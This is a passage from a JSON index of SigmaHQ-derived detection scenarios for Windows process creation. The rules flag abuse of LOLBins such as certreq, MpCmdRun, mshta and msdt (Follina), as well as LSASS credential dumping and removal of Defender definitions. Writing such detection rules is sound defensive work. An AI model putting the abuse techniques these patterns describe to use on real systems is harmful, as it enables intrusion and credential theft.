"Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_printbrm.yml", "version": "0.2", "versions": {"0.1": {"digest": "f24e3d13ced5118281d78fb1885a2330a3231c13ed212669c6944c31b5c107c8"}, "0.2": {"digest": "1e5ceb82541af090e0fd1f1b6836b57005cd71e1734c2da22f95bf4890083690"}}}, "sigmahq/proc_creation_win_lolbin_settingsynchost": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_settingsynchost\ndescription: |\n  Detects using SettingSyncHost.exe to run hijacked binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (not (evt.Parsed.Image startsWith 'C:\\\\Windows\\\\System32\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\SysWOW64\\\\') && evt.Parsed.ParentCommandLine contains 'cmd.exe /c' && evt.Parsed.ParentCommandLine contains 'RoamDiag.cmd' && evt.Parsed.ParentCommandLine contains '-outputpath')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.008\n\n  label: \"Using SettingSyncHost.exe as LOLBin\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects using SettingSyncHost.exe to run hijacked binary\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_settingsynchost.yml", "version": "0.2", "versions": {"0.1": {"digest": "ef22ef9cf233879e71e0204bf090f3042b4787ffd29eaf6b6548ddb6a562b3d6"}, "0.2": {"digest": "2500e26b424c59cb1dd2c452346a29842ededc4fee80cba5cb113790bb99fa5c"}}}, "sigmahq/proc_creation_win_lolbin_susp_certreq_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_susp_certreq_download\ndescription: |\n  Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\certreq.exe' || evt.Parsed.OriginalFileName == 'CertReq.exe') && evt.Parsed.CommandLine contains ' -Post ' && evt.Parsed.CommandLine contains ' -config ' && evt.Parsed.CommandLine contains ' http' && evt.Parsed.CommandLine contains ' C:\\\\windows\\\\win.ini ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"Suspicious Certreq Command to Download\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_susp_certreq_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "2a8006c9f8e16e990e31e59e5713ac45ef1b06f7490ee3361b0c420f8bd2b425"}, "0.2": {"digest": "0468d1fb0dd5eb3cbfd0e9652fa7980e9ad98c4381e75e7d8a553a5e15777a8e"}}}, "sigmahq/proc_creation_win_lolbin_susp_grpconv": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_susp_grpconv\ndescription: |\n  Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'grpconv.exe -o' || evt.Parsed.CommandLine contains 'grpconv -o')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1547\n\n  label: \"Suspicious GrpConv Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_susp_grpconv.yml", "version": "0.2", "versions": {"0.1": {"digest": "20809e6e370ba584841de388cbdbd558f528b6594cd63ad4ac38e1b82a5d18cd"}, "0.2": {"digest": "30787bdc34e5979a5cb7da111bef8f52fa02127e17da5a011e948620b48d51fa"}}}, "sigmahq/proc_creation_win_lolbin_tttracer_mod_load": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_tttracer_mod_load\ndescription: |\n  Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\tttracer.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n   - attack.t1003.001\n\n  label: \"Time Travel Debugging Utility Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_tttracer_mod_load.yml", "version": "0.2", "versions": {"0.1": {"digest": "b2f16c40c3f114a2746652abed8a95614dcd6e7a5c935a4051d42c4dda7475e3"}, "0.2": {"digest": "3c9fc0290997a6bb3ed0ca3c7bee0bc64e87514baa9859561bbde0aa993460be"}}}, "sigmahq/proc_creation_win_lolbin_visual_basic_compiler": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_visual_basic_compiler\ndescription: |\n  Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\vbc.exe' && evt.Parsed.Image endsWith '\\\\cvtres.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027.004\n\n  label: \"Visual Basic Command Line Compiler Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_visual_basic_compiler.yml", "version": "0.2", "versions": {"0.1": {"digest": "4010854d0b2792ef7f54ff0c3479319f1add341d754d1861ea31db56951c4cf2"}, "0.2": {"digest": "203143c75de6110ddc3033b51855b688bac683382141c63b0f794dbb1bed3dd8"}}}, "sigmahq/proc_creation_win_lsass_process_clone": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lsass_process_clone\ndescription: |\n  Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\Windows\\\\System32\\\\lsass.exe' && evt.Parsed.Image endsWith '\\\\Windows\\\\System32\\\\lsass.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003\n   - attack.t1003.001\n\n  label: \"Potential Credential Dumping Via LSASS Process Clone\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity\n", "path": "scenarios/sigmahq/proc_creation_win_lsass_process_clone.yml", "version": "0.2", "versions": {"0.1": {"digest": "109720ece18e701ec975e364f29a08ea53b4cd103d717cc22c4f7080ae478841"}, "0.2": {"digest": "1f23c927c0efce23a68fffe8a300c3b75af9bee8d32837abce04c650f20f060a"}}}, "sigmahq/proc_creation_win_mmc_mmc20_lateral_movement": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mmc_mmc20_lateral_movement\ndescription: |\n  Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\svchost.exe' && evt.Parsed.Image endsWith '\\\\mmc.exe' && evt.Parsed.CommandLine contains '-Embedding')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.003\n\n  label: \"MMC20 Lateral Movement\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe\n", "path": "scenarios/sigmahq/proc_creation_win_mmc_mmc20_lateral_movement.yml", "version": "0.2", "versions": {"0.1": {"digest": "ab45f9a7af55168ce2f2ddb7944fde63b845f89a2286228151187c38de834601"}, "0.2": {"digest": "45a08953c233c348b04d7954004c454361e11c31ed60bf8941b91f10c0799aea"}}}, "sigmahq/proc_creation_win_mmc_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mmc_susp_child_process\ndescription: |\n  Detects a Windows command line executable started from MMC\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\mmc.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image contains '\\\\BITSADMIN'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.003\n\n  label: \"MMC Spawning Windows Shell\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a Windows command line executable started from MMC\n", "path": "scenarios/sigmahq/proc_creation_win_mmc_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "2255e9c4eca85a8d55236f0f6f5eb3159b4949e1c03b58449477ffdfa6b0bfd4"}, "0.2": {"digest": "5f57ae95c9bffee7a772bc862d6ef603c7b32c60deb11091cff9621029d8a3b0"}}}, "sigmahq/proc_creation_win_mofcomp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mofcomp_execution\ndescription: |\n  Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline. The \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. Attackers abuse this utility to install malicious MOF scripts \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\mofcomp.exe' || evt.Parsed.OriginalFileName == 'mofcomp.exe') && (evt.Parsed.ParentImage endsWith '\\\\cmd.exe' || evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe' || evt.Parsed.ParentImage endsWith '\\\\wsl.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe' || evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\WINDOWS\\\\Temp\\\\' || evt.Parsed.CommandLine contains '%temp%' || evt.Parsed.CommandLine contains '%tmp%' || evt.Parsed.CommandLine contains '%appdata%') && not (evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe' && evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\TEMP\\\\' && evt.Parsed.CommandLine endsWith '.mof') && not (evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\TEMP\\\\' && evt.Parsed.CommandLine endsWith '.mof'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Potential Suspicious Mofcomp Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline. The \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. Attackers abuse this utility to install malicious MOF scripts \n", "path": "scenarios/sigmahq/proc_creation_win_mofcomp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "9a20decf61261dea8d69d91ec606388d6ecdc6ee1b458b10b44e283865710381"}, "0.2": {"digest": "8ad808c819ace5671e62f59307805bf04425296f360a0adb3fb0b3165eca3d0d"}}}, "sigmahq/proc_creation_win_mpcmdrun_dll_sideload_defender": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mpcmdrun_dll_sideload_defender\ndescription: |\n  Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\MpCmdRun.exe' || evt.Parsed.Image endsWith '\\\\NisSrv.exe') && not (evt.Parsed.Image startsWith 'C:\\\\Program Files (x86)\\\\Windows Defender\\\\' || evt.Parsed.Image startsWith 'C:\\\\Program Files\\\\Microsoft Security Client\\\\' || evt.Parsed.Image startsWith 'C:\\\\Program Files\\\\Windows Defender\\\\' || evt.Parsed.Image startsWith 'C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\WinSxS\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.002\n\n  label: \"Potential Mpclient.DLL Sideloading Via Defender Binaries\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory.\n", "path": "scenarios/sigmahq/proc_creation_win_mpcmdrun_dll_sideload_defender.yml", "version": "0.2", "versions": {"0.1": {"digest": "1a55e3c5c7df8f974f22005a973cf0fe414cfd5ec89094f5c3f8cec304a05553"}, "0.2": {"digest": "c7bd4a9a9f670775b9bd5a2c421a28bb7fa3c2828c68f5eb3bd85ed96de8f889"}}}, "sigmahq/proc_creation_win_mpcmdrun_download_arbitrary_file": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mpcmdrun_download_arbitrary_file\ndescription: |\n  Detects the use of Windows Defender MpCmdRun.EXE to download files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == 'MpCmdRun.exe' || evt.Parsed.Image endsWith '\\\\MpCmdRun.exe' || evt.Parsed.CommandLine contains 'MpCmdRun.exe' || evt.Parsed.Description == 'Microsoft Malware Protection Command Line Utility') && evt.Parsed.CommandLine contains 'DownloadFile' && evt.Parsed.CommandLine contains 'url')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n   - attack.t1105\n\n  label: \"File Download Via Windows Defender MpCmpRun.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Windows Defender MpCmdRun.EXE to download files\n", "path": "scenarios/sigmahq/proc_creation_win_mpcmdrun_download_arbitrary_file.yml", "version": "0.2", "versions": {"0.1": {"digest": "c8034eb16b330912a229f177cf4342c2c93f1a7e123af1b1610cdce871a88704"}, "0.2": {"digest": "dff0c8a39db3eeb6d7a06344d239b5213225d4ccaa71993d004cedecc14b13ae"}}}, "sigmahq/proc_creation_win_mpcmdrun_remove_windows_defender_definition": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mpcmdrun_remove_windows_defender_definition\ndescription: |\n  Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\MpCmdRun.exe' || evt.Parsed.OriginalFileName == 'MpCmdRun.exe') && evt.Parsed.CommandLine contains ' -RemoveDefinitions' && evt.Parsed.CommandLine contains ' -All')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Windows Defender Definition Files Removed\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\n", "path": "scenarios/sigmahq/proc_creation_win_mpcmdrun_remove_windows_defender_definition.yml", "version": "0.2", "versions": {"0.1": {"digest": "134be7ff16890019bef95d437a748247b081bd6ef5eeed692974ef0c532f2259"}, "0.2": {"digest": "c9d468060f229352f7dafb6e1731cc719f89a2a813b4f1d2104ffc89cd103ebe"}}}, "sigmahq/proc_creation_win_msdt_arbitrary_command_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_msdt_arbitrary_command_execution\ndescription: |\n  Detects processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\msdt.exe' || evt.Parsed.OriginalFileName == 'msdt.exe') && (evt.Parsed.CommandLine contains 'IT_BrowseForFile=' || evt.Parsed.CommandLine contains ' PCWDiagnostic' && (evt.Parsed.CommandLine contains ' -af ' || evt.Parsed.CommandLine contains ' /af ' || evt.Parsed.CommandLine contains ' \u2013af ' || evt.Parsed.CommandLine contains ' \u2014af ' || evt.Parsed.CommandLine contains ' \u2015af ')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Potential Arbitrary Command Execution Using Msdt.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability\n", "path": "scenarios/sigmahq/proc_creation_win_msdt_arbitrary_command_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "683406f6756976f511ba9bf25640de802925ef46b89c13398b46f36e6662b758"}, "0.2": {"digest": "5bada6783f97a392bcc2f73d88bf57ca499bade79b0e07ed5691ce96e582c1a5"}}}, "sigmahq/proc_creation_win_msdt_susp_parent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_msdt_susp_parent\ndescription: |\n  Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\cmd.exe' || evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\mshta.exe' || evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe' || evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe' || evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' || evt.Parsed.ParentImage endsWith '\\\\schtasks.exe' || evt.Parsed.ParentImage endsWith '\\\\wmic.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe' || evt.Parsed.ParentImage endsWith '\\\\wsl.exe') && (evt.Parsed.Image endsWith '\\\\msdt.exe' || evt.Parsed.OriginalFileName == 'msdt.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1218\n\n  label: \"Suspicious MSDT Parent Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation\n", "path": "scenarios/sigmahq/proc_creation_win_msdt_susp_parent.yml", "version": "0.2", "versions": {"0.1": {"digest": "347318624352ddc04685418cf51439e02f97fa61932de5a63b0e921eb410fdf4"}, "0.2": {"digest": "345ba488be9aaa7b101b737bf00cd4b90cf570903d6a7377af1145978bb507b7"}}}, "sigmahq/proc_creation_win_mshta_http": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mshta_http\ndescription: |\n  Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.OriginalFileName == 'MSHTA.EXE') && (evt.Parsed.CommandLine contains 'http://' || evt.Parsed.CommandLine contains 'https://' || evt.Parsed.CommandLine contains 'ftp://'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.005\n\n  label: \"Remotely Hosted HTA File Executed Via Mshta.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file\n", "path": "scenarios/sigmahq/proc_creation_win_mshta_http.yml", "version": "0.2", "versions": {"0.1": {"digest": "2e159fd15f6f827bc0017fd449ee7e6c0fe6992d83baec6b2f14e4b68f6a98fc"}, "0.2": {"digest": "8b098a27c9860d580900867c4af3040691e82c47b3dbda2ed43ac0d7b298d443"}}}, "sigmahq/proc_creation_win_mshta_javascript": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mshta_javascript\ndescription: |\n  Detects execution of javascript code using \"mshta.exe\".\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.OriginalFileName == 'MSHTA.EXE') && evt.Parsed.CommandLine contains 'javascript')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.005\n\n  label: \"Suspicious JavaScript Execution Via Mshta.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of javascript code using \"mshta.exe\".\n", "path": "scenarios/sigmahq/proc_creation_win_mshta_javascript.yml", "version": "0.2", "versions": {"0.1": {"digest": "354087e00a861bd7e8bba9df37807577b5ced15c60c0ae8f3205cdfc69524bfd"}, "0.2": {"digest": "2d0a6c3c592494a1af8b33fb5aa6abc45b186ae5c3d73c302704a032fe7c23c3"}}}, "sigmahq/proc_creation_win_mshta_lethalhta_technique": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mshta_lethalhta_technique\ndescription: |\n  Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\svchost.exe' && evt.Parsed.Image endsWith '\\\\mshta.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.005\n\n  label: \"Potential LethalHTA Technique Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process\n", "path": "scenarios/sigmahq/proc_creation_win_mshta_lethalhta_technique.yml", "version": "0.2", "versions": {"0.1": {"digest": "bff6bf1e71fc4925a9d7ae5a9effce21250c5c379bb630917bcb75006e07557a"}, "0.2": {"digest": "93355d13a1f8142b6c056eadb3bcc042ad8f4abbb286ec4d3c36dbd09b6d26e9"}}}, "sigmahq/proc_creation_win_mshta_susp_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mshta_susp_child_processes\ndescription: |\n  Detects a suspicious process spawning from an \"mshta.exe\" process, which could be indicative of a malicious HTA script execution\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\mshta.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.OriginalFileName in ['Cmd.Exe', 'PowerShell.EXE', 'pwsh.dll', 'wscript.exe', 'cscript.exe', 'Bash.exe', 'reg.exe', 'REGSVR32.EXE', 'bitsadmin.exe']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.005\n\n  label: \"Suspicious MSHTA Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious process spawning from an \"mshta.exe\" process, which could be indicative of a malicious HTA script execution\n", "path": "scenarios/sigmahq/proc_creation_win_mshta_susp_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "b1e7d615a52ce65fe3d519195cb9bdd3d3c208697dcfbabd712db9cb721dfd52"}, "0.2": {"digest": "c8851e38dd4609c0c3b0e0500f22f85011360d2349c7ea11e3179281df4e66fd"}}}, "sigmahq/proc_creation_win_mshta_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mshta_susp_execution\ndescription: |\n  Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\mshta.exe' && (evt.Parsed.CommandLine contains 'vbscript' || evt.Parsed.CommandLine contains '.jpg' || evt.Parsed.CommandLine contains '.png' || evt.Parsed.CommandLine contains '.lnk' || evt.Parsed.CommandLine contains '.xls' || evt.Parsed.CommandLine contains '.doc' || evt.Parsed.CommandLine contains '.zip' || evt.Parsed.CommandLine contains '.dll'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1140\n   - attack.t1218.005\n   - attack.t1059.007\n\n  label: \"MSHTA Suspicious Execution 01\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\n", "path": "scenarios/sigmahq/proc_creation_win_mshta_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "5e4757c1d6e1f1a73e1e7a8350631055e26e8e89c4461e420d93c0ebb700a569"}, "0.2": {"digest": "e2e3ed8f991c86fec1af7744f5859020ab115049687386bce5ceb890d17de03c"}}}, "sigmahq/proc_creation_win_mshta_susp_pattern": {"content": "type: trigger\nname: sigmahq/proc_creation_win_mshta_susp_pattern\ndescription: |\n  Detects suspicious mshta process execution patterns\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.OriginalFileName == 'MSHTA.EXE') && (evt.Parsed.ParentImage endsWith '\\\\cmd.exe' || evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe' || evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe' || evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe') && (evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\' || evt.Parsed.CommandLine contains 'C:\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\Temp\\\\') || (evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.OriginalFileName == 'MSHTA.EXE') && not (evt.Parsed.Image startsWith 'C:\\\\Windows\\\\System32\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\SysWOW64\\\\' || 